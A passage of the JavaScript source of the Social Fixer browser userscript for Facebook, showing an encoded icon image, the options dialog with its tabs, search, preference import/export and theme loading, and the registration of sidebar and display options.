%A9%09%D4%16%AB%D5%A9%1DU%BB%A96%AE%CERwR%8FP%CFQ_%A3%BE_%FD%82%FAc%0D%B2%86%85F%A0%86H%A3Tc%B7%C6%19%8D!%16%C62e%F1XB%D6rV%03%EB%2Ck%98Mb%5B%B2%F9%ECLv%05%FB%1Bv%2F%7BLSCs%AAf%ACf%91f%9D%E6q%CD%01%0E%C6%B1%E0%F09%D9%9CJ%CE!%CE%0D%CE%7B-%03-%3F-%B1%D6j%ADf%AD~%AD7%DAz%DA%BE%DAb%EDr%ED%16%ED%EB%DA%EFup%9D%40%9D%2C%9D%F5%3Am%3A%F7u%09%BA6%BAQ%BA%85%BA%DBu%CF%EA%3E%D3c%EBy%E9%09%F5%CA%F5%0E%E9%DD%D1G%F5m%F4%A3%F5%17%EA%EF%D6%EF%D1%1F704%086%90%19l18c%F0%CC%90c%E8k%98i%B8%D1%F0%84%E1%A8%11%CBh%BA%91%C4h%A3%D1I%A3'%B8%26%EE%87g%E35x%17%3Ef%ACo%1Cb%AC4%DEe%DCk%3Cabi2%DB%A4%C4%A4%C5%E4%BE)%CD%94k%9Af%BA%D1%B4%D3t%CC%CC%C8%2C%DC%AC%D8%AC%C9%EC%8E9%D5%9Ck%9Ea%BE%D9%BC%DB%FC%8D%85%A5E%9C%C5J%8B6%8B%C7%96%DA%96%7C%CB%05%96M%96%F7%AC%98V%3EVyV%F5V%D7%ACI%D6%5C%EB%2C%EBm%D6WlP%1BW%9B%0C%9B%3A%9B%CB%B6%A8%AD%9B%AD%C4v%9Bm%DF%14%E2%14%8F)%D2)%F5Sn%DA1%EC%FC%EC%0A%EC%9A%EC%06%ED9%F6a%F6%25%F6m%F6%CF%1D%CC%1C%12%1D%D6%3Bt%3B%7Crtu%CCvlp%BC%EB%A4%E14%C3%A9%C4%A9%C3%E9Wg%1Bg%A1s%9D%F35%17%A6K%90%CB%12%97v%97%17Sm%A7%8A%A7n%9Fz%CB%95%E5%1A%EE%BA%D2%B5%D3%F5%A3%9B%BB%9B%DC%AD%D9m%D4%DD%CC%3D%C5%7D%AB%FBM.%9B%1B%C9%5D%C3%3D%EFA%F4%F0%F7X%E2q%CC%E3%9D%A7%9B%A7%C2%F3%90%E7%2F%5Ev%5EY%5E%FB%BD%1EO%B3%9C%26%9E%D60m%C8%DB%C4%5B%E0%BD%CB%7B%60%3A%3E%3De%FA%CE%E9%03%3E%C6%3E%02%9Fz%9F%87%BE%A6%BE%22%DF%3D%BE%23~%D6~%99~%07%FC%9E%FB%3B%FA%CB%FD%8F%F8%BF%E1y%F2%16%F1N%05%60%01%C1%01%E5%01%BD%81%1A%81%B3%03k%03%1F%04%99%04%A5%075%05%8D%05%BB%06%2F%0C%3E%15B%0C%09%0DY%1Fr%93o%C0%17%F2%1B%F9c3%DCg%2C%9A%D1%15%CA%08%9D%15Z%1B%FA0%CC%26L%1E%D6%11%8E%86%CF%08%DF%10~o%A6%F9L%E9%CC%B6%08%88%E0Gl%88%B8%1Fi%19%99%17%F9%7D%14)*2%AA.%EAQ%B4Stqt%F7%2C%D6%AC%E4Y%FBg%BD%8E%F1%8F%A9%8C%B9%3B%DBj%B6rvg%ACjlRlc%EC%9B%B8%80%B8%AA%B8%81x%87%F8E%F1%97%12t%13%24%09%ED%89%E4%C4%D8%C4%3D%89%E3s%02%E7l%9A3%9C%E4%9AT%96tc%AE%E5%DC%A2%B9%17%E6%E9%CE%CB%9Ew%3CY5Y%90%7C8%85%98%12%97%B2%3F%E5%83%20BP%2F%18O%E5%A7nM%1D%13%F2%84%9B%85OE%BE%A2%8D%A2Q%B1%B7%B8J%3C%92%E6%9DV%95%F68%DD%3B%7DC%FAh%86OFu%C63%09OR%2By%91%19%92%B9%23%F3MVD%D6%DE%AC%CF%D9q%D9-9%94%9C%94%9C%A3R%0Di%96%B4%2B%D70%B7(%B7Of%2B%2B%93%0D%E4y%E6m%CA%1B%93%87%CA%F7%E4%23%F9s%F3%DB%15l%85L%D1%A3%B4R%AEP%0E%16L%2F%A8%2Bx%5B%18%5Bx%B8H%BDHZ%D43%DFf%FE%EA%F9%23%0B%82%16%7C%BD%90%B0P%B8%B0%B3%D8%B8xY%F1%E0%22%BFE%BB%16%23%8BS%17w.1%5DR%BAdxi%F0%D2%7D%CBh%CB%B2%96%FDP%E2XRU%F2jy%DC%F2%8ER%83%D2%A5%A5C%2B%82W4%95%A9%94%C9%CBn%AE%F4Z%B9c%15a%95dU%EFj%97%D5%5BV%7F*%17%95_%ACp%AC%A8%AE%F8%B0F%B8%E6%E2WN_%D5%7C%F5ym%DA%DA%DEJ%B7%CA%ED%EBH%EB%A4%EBn%AC%F7Y%BF%AFJ%BDjA%D5%D0%86%F0%0D%AD%1B%F1%8D%E5%1B_mJ%DEt%A1zj%F5%8E%CD%B4%CD%CA%CD%035a5%ED%5B%CC%B6%AC%DB%F2%A16%A3%F6z%9D%7F%5D%CBV%FD%AD%AB%B7%BE%D9%26%DA%D6%BF%DDw%7B%F3%0E%83%1D%15%3B%DE%EF%94%EC%BC%B5%2BxWk%BDE%7D%F5n%D2%EE%82%DD%8F%1Ab%1B%BA%BF%E6~%DD%B8GwO%C5%9E%8F%7B%A5%7B%07%F6E%EF%EBjtol%DC%AF%BF%BF%B2%09mR6%8D%1EH%3Ap%E5%9B%80o%DA%9B%ED%9Aw%B5pZ*%0E%C2A%E5%C1'%DF%A6%7C%7B%E3P%E8%A1%CE%C3%DC%C3%CD%DF%99%7F%B7%F5%08%EBHy%2B%D2%3A%BFu%AC-%A3m%A0%3D%A1%BD%EF%E8%8C%A3%9D%1D%5E%1DG%BE%B7%FF~%EF1%E3cu%C75%8FW%9E%A0%9D(%3D%F1%F9%E4%82%93%E3%A7d%A7%9E%9DN%3F%3D%D4%99%DCy%F7L%FC%99k%5DQ%5D%BDgC%CF%9E%3F%17t%EEL%B7_%F7%C9%F3%DE%E7%8F%5D%F0%BCp%F4%22%F7b%DB%25%B7K%AD%3D%AE%3DG~p%FD%E1H%AF%5Bo%EBe%F7%CB%EDW%3C%AEt%F4M%EB%3B%D1%EF%D3%7F%FAj%C0%D5s%D7%F8%D7.%5D%9Fy%BD%EF%C6%EC%1B%B7n%26%DD%1C%B8%25%BA%F5%F8v%F6%ED%17w%0A%EEL%DC%5Dz%8Fx%AF%FC%BE%DA%FD%EA%07%FA%0F%EA%7F%B4%FE%B1e%C0m%E0%F8%60%C0%60%CF%C3Y%0F%EF%0E%09%87%9E%FE%94%FF%D3%87%E1%D2G%CCG%D5%23F%23%8D%8F%9D%1F%1F%1B%0D%1A%BD%F2d%CE%93%E1%A7%B2%A7%13%CF%CA~V%FFy%EBs%AB%E7%DF%FD%E2%FBK%CFX%FC%D8%F0%0B%F9%8B%CF%BF%AEy%A9%F3r%EF%AB%A9%AF%3A%C7%23%C7%1F%BC%CEy%3D%F1%A6%FC%AD%CE%DB%7D%EF%B8%EF%BA%DF%C7%BD%1F%99(%FC%40%FEP%F3%D1%FAc%C7%A7%D0O%F7%3E%E7%7C%FE%FC%2F%F7%84%F3%FB%25%D2%9F3%00%00%00%04gAMA%00%00%B1%8E%7C%FBQ%93%00%00%00%20cHRM%00%00z%25%00%00%80%83%00%00%F9%FF%00%00%80%E9%00%00u0%00%00%EA%60%00%00%3A%98%00%00%17o%92_%C5F%00%00%07~IDATx%DA%CC%9A%7BpT%F5%15%C7%3F%F7%B1w%9Fyl%B2%09I%C8%8B%98%18(%12(B%A2T%82%C8C%24%7D%3A%B6%95%B63%9DN%3B%9D%B60%B62%B6R%E8%CB%3A%EA%80%06%B1%EA%8C3%B5XE%CB%94Amic%092%96G%00%07y%07a%85%18%40%5EI%C3%E6%BD%BBw%EF%B3%7FP%19)%84%DDM%B2!%BF%7F%F7%9C%BB%BF%CF%FD%9Ds%EE%F7%9C%7B%85%E2%AA%AF%20%C9N%BC%99c%E7%B8%7C9%0F%3B%DC%19%D5%A2(K%603%3A%97%80m%9B%18%B1%FE%A0%DA%7F%E9%85Ho%FBz-%D2%85%2C%20%E0I%CF%5B%92%997%FEy%04%11%DB%B2%18%BD%10%006%82%20%A2x2g(%9E%AC%19%82%24%D7%EAj%EFb)%BFb%D6%EC%EC%C2%C9%7F%B5%01lk%84%B7%04%B6ecY6%96mc%03%02%02%82%90%88%B3%0D%B6%8D%D3%9B%3D%CD6%F5N%D9%EB%2Fz%14A%02%CB%18%91%CD%EB%86%89%A6%99%08%82%80%24%09%B8%5D%0E%3C.%07%A2(%A0%C6%0C%C2Q%0D%DD%B0%B0-%1B%A7%22%23%CB%E2%8Do%85m%E1%F5%17-%96%9D%9E%CC%E9%B6e%A6%1C%40%8D%19X%96Eia%16%B5%D3J%A9(%C9%267%DBG%C0%EF!%23%CD%85%24%8A%F4G4%3A%3A%C3%B4%87%FA%08%B6v%B0u%F7%C7%7Cr%B1%1B%AF%5BA%14%85%01%0E%C6Br%B8%03%C2%17%16%BD%D4%09%F8S%05%60Y6j%CC%60%EAm%05%7C%F3%BE*%EE%9CR%8C%CF%A3%24%E4%7B%A9%2B%CC%C6%C6%A3%BC%B1%E9%10%86e%23%89%03%C6%5C%A7%9C%CA%CC%B6l%1B%D3%B2X%FA%BD%BBXTW%85%24%89I%F9%07%FC%5E~%F4%60%0D%13%CArYV%BF%19%DB%06a%80%04%92S%1AN%AA%C1%E2o%DF%C1w%BE%3CeP%FE%86i%B1%EF%E8y%1A%B6%07%11%25%F1%86%B7%3Ce%20%86i1%26%DB%CB7%EE%9B%94%B4o%CB%99%10%5B%F7%B4%B0mo%2B%ADg%BB0M%0B%B7%CB%01%C2M%00%89i%06sg%94%93%E6u%26d%DF%DD%A7%B2%FF%E8966%1E%E5p%B0%8DhL%C7!K8d%09%C5!%C5%F5O%09%88m%83S%91%B9w%E6%ADqm%0F%05%2F%B2%F3%83S46%9D%E4bG%1F%08%E0Rd%BCn%25%A9%FFL%09%88iY%04%FC%5EJ%C7%FA%E3V%A5%A5O5%D0%D1%15%C6%EBR.%87%CF%20%97%98%AA%B0%AA%99%5C%14%B7%CC%FA%3CN%FC%19n%DCNG%9C%07%DFM%02%B1m%982%3E%2F%AE%9D%CB)S%3D%A9%10M%1F%FA%03YL%05%84%C7%E5%A0%A2%24%90%90%FD%FD%F3'%92%E6ub%D9%F6%E8%02%D1t%83%CAq%01*J%13%03%A9(%09PQ%9A%8D%A6%99%A3%0BD7%2C%EE%98R%7C%239q%CD%AA%9B5%1E%CB%8A%7F%22%9F%CA%9D%A8%AA%A7%1ED%14a%7CYNR%3E3o%2F!%23%CD%899%00LL3%E9%0B%C7p%C8%225%93%8Bx%60%C1m%D7%80%0Fk%F95L%8B%FC%9Ct%AAn%CDK%CA%2F7%DBG%ED%F4qlz%2F%88%D7%7D%B9%04%9B%A6%85%AA%19%08%82%C0%E7n%C9%A1%BA%AA%88%85%B3*)%2F%CE%A6%BB7%CA%D6%DD-DT%E3%CA%C9%0F%2BHL3%982!%1F%7F%86%3Bi%DF%AF%CD%9D%C8%3B%DB%3F%22%A6%19h%BAIN%96%97%BB%AB%CB%98%5DS%C6%DD5eW%3D%DD%05Q%C0%A9%C8%84%A3%3A%9F%EA%96a%05%B1-%A8%9ET8(%DF%CAq%01J%0A2%91e%89%D95e%2C%AC%AD%A4(%3F%E3%BA%B6%3D%7D*%91%A8%8E%F8%19%25%2C%0F_%B52)%2F%C9b%DE%8C%F2A%F9%BB%5D%0E%FE%F0%AB%2F%11%F0%7B%E3j%AB%60k%07%3D%FD%EAU2f%D8%40%D4%98%C1%AC%EA2%3CIj%A4%CF%AE%82%DC%F4%F87L3y%B3%F1(%F2%FF%F56%C3R%B5t%C3%A40%2F%9DEu%93S%DE2%BF%BC%F1%03%F6%1C%3E%8BS%91%87%1F%24%A6%99%3CXWE%C0%EFI)D%C3%B6%20k%DF%DCG%DAu4%DC%90A%22%AANUe%1E%DFJ%F1i%9C%3C%7D%89U%7F%DA%81%2CI%D7mw%C5%A1%26xf%9A%8B%DF%2C%BE%07Y%96R%06%D1%DD%1Be%F9%EA-%84%A3%FA%80*Y%1CJ%5E%88%A2%C0%EF%96%CC%A1%BC8%3Be%10%9An%B2b%CD%BB%B4%9C%0D%E1R%E4%E1%D5Z%9An%22K%22O%FCl%1E%B5%D3%C7%A54%A4%9Ex%E9%DF4%ED%3F%1D%B7c%14%93Ol%03%97Sf%E5%23%0B%98sg%F9%907z%AE%ADg%C0%DF%5E%7C%E3%7D%FE%B6%F5XB%7D%BF%9C%2CD%86%CF%C5%93K%E7S%5DU4%E8%CDwt%86il%3A%C1%B6%BD%A78s%BE%9BuO%7F%9D%BC%40%DAU6%7F%F9%E7a%D6%BE%B5%0Fo%82%C3%BC%84%40%04%20%1A3%C8%CAp%F3%DC%8A%2F2%E1%96%DCA4%5C6%07%3E%BC%C0%86%CD%CD%1C%3A~%81%F6P%18Y%12%D1%0D%93%86m%1F%F1%FD%07%A6%5D%B1%7D%7B%EB1V%BF%D2%84%E2%90%AE%92!C%06%89%C4t%C6d%FB%A8%7Ft%E1%A0%20%B64%9Dd%DD%A6%83%B4%9C%09%A1j%06.E%BE%D2%CF%8B%A2%C0%E6%9D'%F8%EEW%A7%22%CB%22%FB%3F%3CO%FD%DA%9D%C8%92%88%24%26%1E%F9qA%A2%AA%CE%D81%E9%D4%2F%AB%A3%A2%24%B9%EA%14l%FD%0F%CF%BD%B6%87%BDG%CE%22%08%02NE%BA%26i%15%87%C4%A9s%5D4%1D8Mq~%26%CBWoA%D3%CD%84fY%09%83D%A2%3A%E3%0A%FD%ACY%5EGQ~fR%17%DE%B8%B9%99g_%DDE4f%E0v9n4%24D%92%04%5Ex%FD%7D%00B%DD%11%5C%CE%E4%25%E0%80%1E%E1%A8%C6%84%B2%5CV%FE%7C%01Ey%19%89%CF%B4L%8BU%2F%EF%60%C3%BF%9Aq9e%3C%09%CC%AA%14Y%E2%5C%7B%0F%D8%0C%0Ab%40%90%FE%88%C6%E4%F1y%3C%F3%8B%85%E4dy%93%18%CC%D9%3C%B3v'%EB%1B%8E%90%E6u%92%60%9Eb%C35jv%C8%20%BD%E1%183%3E_%CC%CAG%16%90%E1s%25u%B1U%7F%DC%CE%FA%86%23%A4%FB%9C%8C%F4%BA%0A%A4%2F%1C%A3vZ)%8F%FFt%5E%D2%10%CF%BF%BE%9B%F5%EF%1CIxh%9D2%90%FE%88%C6%5D%B7%97%F2%D4%D2%7B%93%DE%CC%BA%BF%1F%E4%95%B7%0E%90%E6Q%12%0E%A7%94%80%F4%F6%C7X0%B3%82%C7%1E%9A%8B%DB%E9H%BA%3A%AD%FEs%13n%A7c%C0%B7I%23%02%12%8Eh%D4%CD%AA%E4%B7K%E6%24%5D1%1A%B6%05yzm%13.%C51%E0%CB%CA%11%03%B9%7F%FED~%FD%93%7B%92v%DC%B1%EF%14%8F%BD%F8%1E%A2x%F95%F3%CD%5E%82m%DB!%20%2B%19%A7%3D%07%CF%B0%AC%BE%11U3q%C8%22%A3%60u%26%BD%8B%83%C7%2F%B0b%CD%BBDb%FAh%81%B8%AC%D9L%D3L8.%3E%FE%24%C4%2F%EB%1B%E9%ED%8F%E1r%C8%A3%06%02%DB%16%C4%B6%B6%B6%96D!%1E~%B2%81K%5D%11%DCNy%D4%7Cv%23%08%22%A6%A9%F5%8A%CD%CD%CD%F5%F1%8C%DBC%FD%2C%7Fv%0B%E7%DA%7BG%15%04%80%20JD%7B%DA6HS%A7N%3D%AE(%CA%98%82%82%82i%D7%CD%A2%9E%08%0F%3D%FE%0FN%9C%09%E1q%3BF%0F%80%20%22J2%91%DE%B6%9D%DD%17%8F%FDPVU%D5%DA%B5k%D7%8F-%CB%0AVTT%FC%C0%E7%F3%E5%C9%FF%9B%B9%F4%85c%2C_%BD%85%60kG%C2-%E7%08%E5%04%A6%A9%86%D4%FE%D0%DB%FD%9D%A7%7Fo%18j%F8%BF%03%00%3A%02%CEg%9E%8DA%82%00%00%00%00IEND%AEB%60%82";
							var optionsWrapper = _template( ''+
						'		<div class="GM_options_wrapper_inner options_dialog">'+
						'			<form name="%key%" id="form_%key%">		\n'+
						'				<div class="GM_options_header">		\n'+
						'					<div class="GM_options_buttons bfb_options_minimized_hide">		\n'+
						'						<input type="button" name="GM_options_save" id="GM_options_save" value="Save">		\n'+
						'						<input type="button" name="GM_options_cancel" id="GM_options_cancel" value="Cancel">\n'+
						'					</div>		\n'+
						'					<img id="bfb_options_icon" src="'+options_icon+'" style="max-height:50px;margin-right:20px;cursor:pointer;" align="left" border="0" title="Click to minimize/maximize options">		\n'+
						'					<div class="bfb_options_minimized_hide"><div style="float:left;margin-right:100px;"><span id="bfb_options_title">Social Fixer</span><br><i>Version '+version+'</i><br><i>User: '+userid+'</i></div><span>Official Site: <b><a href="http://SocialFixer.com" target="_blank">SocialFixer.com</a></b></span><br><br>What\'s New? See <b><a href="http://SocialFixer.com/blog/category/releasenotes/" target="_blank">Release Notes</a></b></div>'+
						'				</div>		\n'+
						'				<div class="GM_options_body bfb_options_minimized_hide" style="clear:both;">		\n'+
						'						%options%		\n'+
						'				</div>		\n'+
						'			</form>		\n'+
						'		</div>', {'options':optionsContent,'key':this.key} );
							var div = this.optionsDiv;
							var self = this;
							if (div==null) {
								this.optionsDiv = doc.createElement('div');
								div = this.optionsDiv;
								div.className = 'GM_options_wrapper '+this.key+'_wrapper ';
								div.id = "bfb_options";
								html( div, optionsWrapper );
								doc.body.appendChild(div);
								bind(div,'click',function(e) { e.stopPropagation(); });
							}
							else {
								html(div,optionsWrapper);
								div.className = 'GM_options_wrapper bfb_window_height100 '+this.key+'_wrapper '+(!this.get('show_advanced_options')?'bfb_options_simple_mode':'');
							}
							var minimize_options = function() { toggleClass( QS(document,'.GM_options_wrapper_inner'),"bfb_options_minimized"); };
							
							var select_tab = function(n) {
								if (typeof n=="object") {
									n = n.getAttribute('rel');
								}
								QSA(div,'.option',function(o) { o.style.display="none"; });
								QSA(div,'.option.'+n,function(o) { o.style.display="block"; });
								QSA(div,'.bfb_tab_selector',function(o) { 
									if (o.getAttribute('rel')==n) {
										addClass(o,'bfb_tab_selected');
									}
									else {
										removeClass(o,'bfb_tab_selected');
									}
								});
							}
							bind('bfb_options_icon','click',minimize_options);
							bind('bfb_minimize_options','click',minimize_options);
							bind('GM_options_save','click',function() { self.saveOptions(); });
							bind('GM_options_cancel','click',function() { self.cancelOptions(); apply_theme(null); });
							bind('bfb_guided_setup','click',function(){ if(typeof guided_setup_action=="function"){guided_setup_action();} });
							
							// Make "tab" selectors clickable
							QSA(div,'.bfb_tab_selector',function(o) {
								bind(o,'click',function() { select_tab(this); return false; });
							});
							if (tab_id) {
								select_tab(tab_id);
							}
							else {
								select_tab('tab_popular');
							}
							// Attach keyup listener to search field
							bind('bfb_options_search','keyup',function() {
								var search_selector = this;
								QSA(this.parentNode,'.bfb_tab_selector',function(o) { 
									if (search_selector==this) { 
										addClass(this,'bfb_tab_selected'); 
									}
									else {
										removeClass(o,'bfb_tab_selected');
									}
								});
								var v = this.value;
								if (v=="") { return; }
								v = v.toLowerCase();
								QSA(div,'.option',function(o) {
									if (hasClass(o,'no_search')) { o.style.display = "none"; return; }
									var val = o.innerHTML;
									QS(o,'.desc',function(desc) { val = desc.innerHTML; });
									o.style.display = (val.toLowerCase().indexOf(v)>=0)?"block":"none";
								});
							});
							
							append($('bfb_user_prefs_option'), button("Export Options",function(){ var json=JSON.stringify(self.prefs,function(k,v){if(k=="story_data"){return undefined;}return v;},1); if(confirm("The text box above will now be populated with your current preferences ("+json.length+" bytes). Continue?")) { $('bfb_user_prefs').value=json;} },"bfb_prefs_export_options") );
							append($('bfb_user_prefs_option'), button("Export All (including story data)",function(){ var json=JSON.stringify(self.prefs,null,1); if(confirm("The text box above will now be populated with your current preferences ("+json.length+" bytes). Continue?")) { $('bfb_user_prefs').value=json;} },"bfb_prefs_export_all") );
							append($('bfb_user_prefs_option'), button("Import",function(){ 
								if(confirm('Are you sure you want to overwrite your existing preferences and import the prefs above?')){
									var json = $('bfb_user_prefs');
									if (json) { json = json.value; }
									if (json) {
										try {
											var prefs = JSON.parse(json);
											self.prefs = prefs;
											self.save();
										}
										catch(e) {
											alert("There was an error importing your preferences:\n"+e.toString());
											alert("To make sure that your prefs are in valid JSON format, visit JSONLint.com");
										}
									}
									else {
										alert("Couldn't find input with import text!");
									}
									self.cancelOptions();
								}
							},"bfb_prefs_import") );
							append($('bfb_user_prefs_option'), button("Clean Story Data",function(){ if(confirm('This will prune old story data from your preferences. (This is also done automatically once a day!)')){clean_prefs();}},"bfb_prefs_clean") );
							append($('bfb_user_prefs_option'), button("Reset Prefs",function(){ 
								if(confirm('ALL OPTIONS WILL BE RESET TO THEIR DEFAULT VALUES! ARE YOU SURE?')){
									options.options.forEach(function(opt,i) {
										if (opt.name) {
											options.set(opt.name,opt['default'],false);
										}
									});
									options.save();
								}
							},"bfb_prefs_reset") );
							// Attach reset buttons
							bind('sfx_option_check_update_reset','click',function(e) {
									options.set('update_show_after',1,false);
									options.set('version_ack',1,false);
									options.save(function() {
										alert("Social Fixer will check for updates again on next refresh");
									});

									cancel_bubble(e);
							},false);
							bind('sfx_option_check_messages_reset','click',function(e) {
									options.set('show_message',true,false);
									options.set('last_message_check',1,false);
									options.save(function() {
										alert("Social Fixer will check for messages again on next refresh");
									});
									cancel_bubble(e);
							},false);
							bind('sfx_option_tips_reset','click',function(e) {
									options.set('tips_show_after',1,false);
									options.set('tips_last_id',0,false);
									options.save(function() {
										alert("Social Fixer will show tips from the beginning on next refresh");
									});
									cancel_bubble(e);
							},false);

							// Load the theme selector panel
							ajax_load($('theme_selector'),'http://SocialFixer.com/themes/select_ajax.php',true,"Loading themes...",true,function(res,el) {
								var theme_url = options.get('theme_url2');
								// Make the themes clickable
								QSA(el,'.theme',function(theme) {
									click(theme,function(e) {
										var pos = offset(e.target);
										var x = ((e.pageX - pos.left) / 256 * 360);
										var y = (e.pageY - pos.top) / 150 * 40;

										var href = theme.getAttribute('href');
										if (href) {
											href += (href.indexOf("?")>0)?"&":"?";
											href +="x="+x+"&y="+y;
										}
										QSA(el,'.theme_selected',function(theme) { removeClass(theme,'theme_selected'); });
										addClass(theme,'theme_selected');
										// Size the "loading" panel to match the theme image
										QS(theme,'.loading',function(l) {
											l.style.width = theme.offsetWidth+"px";
										});
										addClass(theme,'theme_loading');
										// Activate the theme
										if (href) {
											ajax({'cache':true,'method':'GET','url':href,'onload':function(res) { 
												removeClass(theme,'theme_loading');
												QSA(document,'input[name="theme_url2"]',function(i){ i.value=href; });
												apply_theme(res.responseText);
											}});
										}
										else {
											removeClass(theme,'theme_loading');
											QSA(document,'input[name="theme_url2"]',function(i){ i.value=''; });
											apply_theme('');
										}
									});
									// Mark the current theme as selected
									var href = theme.getAttribute('href');
									if (href==theme_url) {
										addClass(theme,'theme_selected');
									}
								});
							});

							// Render the filter lists
							render_filter_lists($('bfb_filter_list'));
							
							div.style.display="block";
						};
						this.hideOptions = function() {
							if (this.optionsDiv!=null) {
								this.optionsDiv.style.display='none';
								html(this.optionsDiv,'');
							}
						};
						this.cancelOptions = function() {
							this.hideOptions();
						};
						this.saveOptions = function() {
							var self = this;
							this.load(function() {
								var doc = document;
								var f = doc.getElementById('form_'+self.key);
								if (f && f.elements) {
									for (var i=0; i<f.elements.length; i++) {
										var e = f.elements[i];
										if (e.name && e.name.indexOf("GM_")!=0 && !hasClass(e,"nosave")) {
											if (e.type=="checkbox") {
												self.set(e.name,e.checked,false);
											}
											else if (e.type=='text') {
												self.set(e.name,e.value,false);
											}
											else if (e.type=='textarea') {
												self.set(e.name,e.value,false);
											}
											else if (e.type=='select-one') {
												self.set(e.name,e.options[e.selectedIndex].value,false);
											}
										}
									}
								}
								else {
									alert('Form not found!');
								}
								
								// Read in the filter rules to create filters list
								var getSelectValue = function(sel){var r=null;for (var i=0; i<sel.options.length; i++) {var o = sel.options[i];if (o.selected) {if(r==null){r={};};r[o.value]=o.text;}}return r;};
								var hasprops = function(o){for(var i in o){return true;}};

								var savefilters = [];
								var tbody = $('bfb_filter_list');
								try {
									if (tbody) {
										var trs = tbody.getElementsByTagName('TR');
										if (trs && trs.length>0) {
											for (var i=0; i<trs.length; i++) {
												var tr = trs[i];
												var filter = {criteria:{},actions:{}};
												var cr=function(name) { return tr.getElementsByClassName(name)[0]; }
												// Criteria
												var actrs = getSelectValue(cr('actrs'));
												if (actrs) { filter.criteria.actrs = actrs; }
					//							var sty = getSelectValue(cr('sty'));
					//							if (sty) {
					//								var styo = {};
					//								for (var sty_id in sty) {
					//									var id_list = sty_id.split(/\s*,+\s*/);
					//									if (id_list) {
					//										for (var j=0; j<id_list.length; j++) {
					//											styo[id_list[j]] = id_list[j];
					//										}
					//									}
					//								}
					//								filter.criteria.sty = styo; 
					//							}
												var app_id = getSelectValue(cr('app_id'));
												if (app_id) { filter.criteria.app_id = app_id; }
												var app_id_custom = cr('app_id_custom');
												if (app_id_custom) {
													var app_ids_custom = app_id_custom.value.split(/\s*,\s*/);
													if (app_ids_custom && app_ids_custom.length>0) {
														for (var j=0; j<app_ids_custom.length; j++) {
															if (app_ids_custom[j].length>0) {
																if (typeof filter.criteria.app_id=="undefined") {
																	filter.criteria.app_id={};
																}
																filter.criteria.app_id[app_ids_custom[j]] = "Custom app_id:"+app_ids_custom[j];
															}
														}
													}
												}
												var regex = cr('regex').value;
												if (regex && regex.length>0) { filter.criteria.regex=regex; }
												var selector = cr('selector').value;
												if (selector && selector.length>0) { filter.criteria.selector=selector; }
												// Actions
												if (cr('action-hide').checked) { filter.actions.hide=true; }
												if (cr('action-minimize').checked) { filter.actions.minimize=true; }
												if (cr('action-addclass').checked) { filter.actions.add_class=cr('add-class').value; }
												if (cr('action-movetotab').checked) { filter.actions.move_to_tab=cr('move-to-tab').value; }
												if (cr('action-stop').checked) { filter.stop=true; }
												filter.disabled = (cr('filter-disabled').value=="true");
												
												if (filter.criteria && filter.criteria.sty && filter.criteria.app_id) {
													// Can't have a filter on both sty and app_id! Doesn't make sense!
													delete filter.criteria.app_id;
												}
												if (hasprops(filter.criteria)) {
													savefilters.push(filter);
												}
											}
											self.set('filters',savefilters,false);
											filters = savefilters;
										}
									}
								} catch(e) { }
								
								self.save(false);
								if (options.get('show_options_save_message')) {
									alert("Refresh the page to see your changes\n\n(You can disable this alert in Options->Advanced->Show 'Refresh the page' alert after saving Options)\n\nThis alert is here just to remind you that changes to options only take effect after you refresh!");
								}
								self.hideOptions();
							});
						};
					}
					catch(e) { return null; }
				}

				// Execute the rest of the script in a function so we can exit if needed
				var options = new GM_options('better_facebook',userid);

				// ==================================================================
				// LOAD OPTIONS AND BEGIN THE REAL PROCESSING!
				// ==================================================================
				// Asynchronous for Chrome
				options.load(function(prefs){
					var option_keys = [];
					// Script Options
					if (options) {
						var a = function(name,type,def,opt,style) { options.addOption(name,type,def,opt,style); }
						a('show_advanced_options','checkbox',false);
						a('disabled','checkbox',false);
						a('enable_on_apps','checkbox',false);
						a('lock_header','checkbox',true);
						a('auto_switch_to_recent_stories','checkbox',true);
						a('auto_switch_to_recent_stories_show_message','checkbox',true);
						
						// RIGHT SIDEBAR
						a('pagelet_toggle','checkbox','true');
						a('show_friend_tracker','checkbox',true);
						a('show_friend_tracker_no_activity_msg','checkbox',true);
						a('friend_tracker_show_note','checkbox',true);
						a('friend_tracker_duration','input',3,{size:2} );
						a('friend_tracker_interval','input',1,{size:2} );
						a('friend_tracker_last_update','hidden',null);
						a('friend_tracker_content','hidden',null);

						a('show_friend_activity','checkbox',true );
						a('friend_activity_interval','input',1,{size:2} );
						a('friend_activity_show_pics','checkbox',true );
						a('friend_activity_hide_text','input','^Profile Picture$',{size:15} );
						a('friend_activity_last_update','hidden',null );
						a('friend_activity_content','hidden',null );
						a('friend_activity_last_seen','hidden','' );
						
						a('show_sticky_note','checkbox',true);
						a('right_panels_hidden','input','',{size:80});

						a('ticker_scroll','checkbox',true);
						a('hide_happening_now','checkbox',false);
						a('unlock_right_col','checkbox',true);
						a('hide_game_sidebar','checkbox',false);
						a('hide_game_ticker','checkbox',false);

						// LEFT PANEL
						a('show_nav_all_connections','checkbox',true );
						a('show_nav_unblock_applications','checkbox',true );

						a('expand_nav_messages2','checkbox',true );
						a('expand_left_nav','checkbox',true);
						a('hide_status_updater','checkbox',false );
						
						a('show_my_pages','checkbox',true );
						a('my_pages_new_window','checkbox',true );
						a('my_pages_default_open','checkbox',true );
						a('my_pages_position','input','3',{size:2} );
						a('my_pages_max_height','input','700',{size:3} );

						a('show_my_events','checkbox',true );
						a('my_events_new_window','checkbox',true );
						a('my_events_default_open','checkbox',false );
						a('my_events_position','input','4',{size:2} );
						a('my_events_max_height','input','700',{size:3} );

						a('show_my_groups','checkbox',true );
						a('my_groups_new_window','checkbox',true );
						a('my_groups_default_open','checkbox',false );
						a('my_groups_position','input','5',{size:2} );
						a('my_groups_max_height','input','700',{size:3} );

						a('show_my_apps','checkbox',true );
						a('my_apps_new_window','checkbox',true );
						a('my_apps_default_open','checkbox',false );
						a('my_apps_position','input','6',{size:2} );
						a('my_apps_max_height','input','700',{size:3} );

						a('show_friends_by_network','checkbox',true );
						a('friends_by_network_new_window','checkbox',true );
						a('friends_by_network_default_open','checkbox',false );
						a('friends_by_network_position','input','7',{size:2} );
						a('friends_by_network_order_by_count','checkbox',false );
						a('friends_by_network_max_height','input','700',{size:3} );

						// DISPLAY OPTIONS
						a('hide_trending_articles','checkbox',false);
						a('hide_sponsored','checkbox',true);
						a('hide_duplicates','checkbox',true);
						a('expand_similar_posts','checkbox',false );
						a('expand_similar_posts_delay','input','1000',{size:4} );
						a('display_control_panel','checkbox',true );
						a('process_profiles','checkbox',true );
						a('process_groups','checkbox',true );
